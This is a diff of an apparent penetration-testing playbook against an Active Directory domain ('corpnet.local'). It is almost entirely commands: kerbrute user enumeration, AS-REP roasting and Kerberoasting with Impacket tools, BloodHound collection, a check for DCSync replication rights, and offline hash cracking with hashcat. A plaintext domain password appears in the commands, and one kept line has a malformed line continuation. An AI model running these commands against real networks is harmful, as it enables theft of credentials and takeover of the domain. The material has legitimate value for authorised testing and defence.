@@ -24,9 +24,7 @@ kerbrute userenum -d corpnet.local --dc 192.168.100.1 usernames.txt -o valid_use
 
 #### 1.2 AS-REP Roasting Check (no creds required)
 ```bash
-GetNPUsers.py corpnet.local/ -usersfile valid_users.txt -dc-ip 192.168.100.1 \
-
-  -format hashcat -no-pass -outputfile asrep_hashes.txt
+impacket-GetNPUsers corpnet.local/ -usersfile valid_users.txt -dc-ip 192.168.100.1 -format hashcat -no-pass -outputfile asrep_hashes.txt
 
 # If a hash is returned, crack offline:
 
@@ -37,30 +35,22 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```bash
 bloodhound-python -u j.melnyk -p 'P@ssw0rd123' -d corpnet.local -ns 192.168.100.1 -c All
 ```
-Load into BloodHound and check for:
-
-HasSPNTarget edges → Kerberoasting candidates
-GetChanges / GetChangesAll (DCSync) edges → replication-rights candidates
-
-#dminTo edges → hosts where the current account (or a reachable account) has local admin — this is the recon signal specific to attack #4, since LSASS dumping requires that access
 
 Direct LDAP equivalents:
 
 # SPN accounts (Kerberoasting candidates)
 ```bash
-GetUserSPNs.py corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
+impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
 ```
 # Replication rights on the domain object (DCSync candidates)
 ```bash
-dacledit.py -action read -target-dn "DC=corpnet,DC=local" \
-
-  corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
+impacket-dacledit -action read -target-dn "DC=corpnet,DC=local" corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
 ```
 
 ### 3. Exploitation
 #### 3.1 Kerberoasting
 ```bash
-GetUserSPNs.py corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1 \ -request -outputfile kerberoast_hashes.txt
+impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1 \ -request -outputfile kerberoast_hashes.txt
 
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
